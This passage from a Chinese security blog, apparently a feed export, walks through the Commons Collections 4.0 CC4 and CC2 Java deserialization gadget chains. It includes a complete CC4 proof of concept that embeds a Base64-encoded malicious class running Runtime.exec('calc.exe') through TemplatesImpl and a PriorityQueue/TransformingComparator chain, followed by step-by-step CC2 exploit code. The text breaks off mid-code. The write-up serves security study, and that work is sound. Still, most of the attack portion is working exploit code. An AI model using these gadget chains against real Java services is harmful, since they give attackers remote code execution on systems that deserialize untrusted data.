class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAQAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAATAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZAAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">Impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] faketransformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Impl&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chaind=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(faketransformers);</span><br><span class="line"></span><br><span class="line">        TransformingComparator comparator=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chaind);</span><br><span class="line">        PriorityQueue queue=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line"></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setValue(chaind,<span class="string">&quot;iTransformers&quot;</span>,transformers);</span><br><span class="line"></span><br><span class="line">        serialize(queue);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        FileOutputStream out=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        FileInputStream in=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        Object o=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String filedname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(filedname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String filedname)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(filedname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/53e8b618/image-20250705183131551.png" alt="image-20250705183131551"></p><p>完整利用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream -&gt; readObject()</span><br><span class="line">PriorityQueue -&gt; readObject()</span><br><span class="line">PriorityQueue -&gt; heapify()</span><br><span class="line">PriorityQueue -&gt; siftDown()</span><br><span class="line">PriorityQueue -&gt; siftDownUsingComparator()</span><br><span class="line">TransformingComparator -&gt; compare()</span><br><span class="line">ChainedTransformer -&gt; transform()</span><br><span class="line">ConstantTransformer -&gt; transform()</span><br><span class="line">InstantiateTransformer -&gt; transform()</span><br><span class="line">TrAXFilter -&gt; TrAXFilter()</span><br><span class="line">TemplatesImpl -&gt; newTransformer()</span><br><span class="line">TemplatesImpl -&gt; getTransletInstance()</span><br><span class="line">TemplatesImpl -&gt; defineTransletClasses()</span><br><span class="line">TemplatesImpl -&gt; defineClass()</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections4.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections4.java</a></p><p><a href="https://curlysean.github.io/2025/02/27/CC4%E9%93%BE/#nAbc8">https://curlysean.github.io/2025/02/27/CC4%E9%93%BE/#nAbc8</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> java安全 </category>
          
          <category> CC链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化：CC2利用链深度解析</title>
      <link href="/archives/2119ec98/"/>
      <url>/archives/2119ec98/</url>
      
        <content type="html"><![CDATA[<h2 id="commons-collections-4-0"><a href="#commons-collections-4-0" class="headerlink" title="commons-collections 4.0"></a>commons-collections 4.0</h2><p>Apache Commons Collections 4.0 是官方针对旧版（commons-collections）的结构性缺陷和 API 设计问题推出的独立进化版本。它常常被作为一个新的包，且与旧版commons-collections的命名空间并不冲突，可以共存在同一个项目中。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul><li><strong>jdk 8u71</strong></li><li><strong>commons-collections-4.0</strong></li></ul><p>具体搭建流程可以看我之前<a href="https://b1uel0n3.github.io/2025/06/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9ACC1%E5%88%A9%E7%94%A8%E9%93%BE%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/">文章</a>。</p><p>注意commons-collections版本为4.0，jdk不影响，maven配置依赖时pom.xml写入的是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h2 id="CC2分析"><a href="#CC2分析" class="headerlink" title="CC2分析"></a>CC2分析</h2><h3 id="InvokerTransformer反射链分析"><a href="#InvokerTransformer反射链分析" class="headerlink" title="InvokerTransformer反射链分析"></a>InvokerTransformer反射链分析</h3><p>观察<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections2.java">ysoserial</a>给的利用链：</p><p><img src="/archives/2119ec98/image-20250704091216950.png" alt="image-20250704091216950"></p><p>可以看到我们后半部分恶意代码的执行依然是通过InvokerTransformer反射调用的Runtime.getRuntime().exec()，即：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ConstantTransformer Runtime=<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(Runtime.class);</span><br><span class="line">InvokerTransformer getRuntime=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">InvokerTransformer invoke=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Runtime.class,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">InvokerTransformer exec=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">ConstantTransformer l=<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;Runtime,getRuntime,invoke,exec,l&#125;;</span><br><span class="line"></span><br><span class="line">ChainedTransformer chind=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>但调用ChainedTransformer.transform的是TransformingComparator.compare()方法，<code>org.apache.commons.collections4.comparators.TransformingComparator</code>是commons-collections 4.0独有的类：</p><p><img src="/archives/2119ec98/image-20250704161348669.png" alt="image-20250704161348669"></p><p>可以看到TransformingComparator.compare会调用this.transformer.transform()方法：</p><p><img src="/archives/2119ec98/image-20250704161839553.png" alt="image-20250704161839553"></p><p>并且Transformer是我们可控的，obj1和obj2同样是我们可调用的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ConstantTransformer Runtime=<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(Runtime.class);</span><br><span class="line">        InvokerTransformer getRuntime=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        InvokerTransformer invoke=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Runtime.class,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        InvokerTransformer exec=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">        ConstantTransformer l=<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;Runtime,getRuntime,invoke,exec,l&#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chind=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        TransformingComparator comparator=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chind);</span><br><span class="line">        comparator.compare(<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/2119ec98/image-20250704163212877.png" alt="image-20250704163212877"></p><p>调用ChainedTransformer.transform方法时传入的参数是不影响我们恶意代码执行的，因为ChainedTransformer.transform中第一个调用的是ConstantTransformer.transform()，而ConstantTransformer.transform()用于返回对象，返回的是创建实例时的对象即Runtime.class与transform方法传入的Object无关，不理解可以看我之前<a href="https://xz.aliyun.com/news/18291">CC1链的解析</a>，所以null即可，这里也是能弹计算机。</p><p>接着我们需要找到能调用TransformingComparator.compare()的方法，ysoserial选用的是PriorityQueue.readObject，也就是将PriorityQueue类作为反序列化的入口：</p><p><img src="/archives/2119ec98/image-20250704165243799.png" alt="image-20250704165243799"></p><p>readObject最后会调用PriorityQueue.heapify()方法，跟进一下：</p><p><img src="/archives/2119ec98/image-20250704165358400.png" alt="image-20250704165358400"></p><p>当<code>i&gt;=0</code>时调用PriorityQueue.siftDown方法，继续更进：</p><p><img src="/archives/2119ec98/image-20250704165610218.png" alt="image-20250704165610218"></p><p>当comparator不为空时调用PriorityQueue.siftDownUsingComparator方法：</p><p><img src="/archives/2119ec98/image-20250704165855141.png" alt="image-20250704165855141"></p><p>最后当<code>k &lt; half</code>时调用comparator.compare方法，所以链子还是挺清晰的：</p><p><img src="/archives/2119ec98/image-20250704171751682.png" alt="image-20250704171751682"></p><p>这里我们先看要实现链子的条件，先看comparator：</p><p><img src="/archives/2119ec98/image-20250704172203772.png" alt="image-20250704172203772"></p><p>comparator是我们可控的，为了让最后执行TransformingComparator.compare()方法，所以我们需要传入comparator为TransformingComparator对象，且initialCapacity必须大于1，不然会报错:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue queue=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br></pre></td></tr></table></figure><p>然后我们看调用siftDown方法的条件：</p><p><img src="/archives/2119ec98/image-20250704172644806.png" alt="image-20250704172644806"></p><p><code>&gt;&gt;&gt;</code>是按位右移补零操作符，当size为0，1时候i都小于0，所以<code>size&gt;=2</code>，但size默认是为0的，需要一个方法改变size的值，而恰好PriorityQueue.offer方法能改变size值：<br><img src="/archives/2119ec98/image-20250704173520211.png" alt="image-20250704173520211"></p><p>每执行一次size的值就会加一，执行两次就能满足我们的条件了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">queue.offer(<span class="number">1</span>);</span><br><span class="line">queue.offer(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>但ysoserial是通过PriorityQueue.add方法来修改size值的：</p><p><img src="/archives/2119ec98/image-20250704195553698.png" alt="image-20250704195553698"></p><p>实际上也是调用的offer方法</p><p>接着看comparator.compare的调用条件：</p><p><img src="/archives/2119ec98/image-20250704202952416.png" alt="image-20250704202952416"></p><p>half为size向右移一位</p><p><img src="/archives/2119ec98/image-20250704203239744.png" alt="image-20250704203239744"></p><p>k传入的是i，即<code>(size&gt;&gt;&gt;1)-1</code>，所以k&lt;half也是成立的</p><p>修改poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ConstantTransformer Runtime=<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(Runtime.class);</span><br><span class="line">        InvokerTransformer getRuntime=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        InvokerTransformer invoke=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Runtime.class,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        InvokerTransformer exec=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">        ConstantTransformer l=<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;Runtime,getRuntime,invoke,exec,l&#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chind=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        TransformingComparator comparator=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chind);</span><br><span class="line">        PriorityQueue queue=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line"></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/2119ec98/image-20250704214354637.png" alt="image-20250704214354637"></p><p>这里有个问题，还没开始反序列化呢就弹计算机了</p><p>这是因为在add方法中，调用的offer方法，而当<code>i!=0</code>时会执行<code>siftUp(i, e);</code>:</p><p><img src="/archives/2119ec98/image-20250704220017237.png" alt="image-20250704220017237"></p><p>而siftUp方法调用<code>siftUpUsingComparator(k, x);</code>：</p><p><img src="/archives/2119ec98/image-20250704220303628.png" alt="image-20250704220303628"></p><p>最后调用comparator.compare()方法从而弹计算机，跟我们要执行的链子效果一模一样。</p><p>为了避免这种情况，所以我们采取跟CC6链一样的方法，先传入假的faketransformers给ChainedTransformer对象，然后在反序列化前通过反射将字段修改回来即可</p><p>最终poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] faketransformers = <span 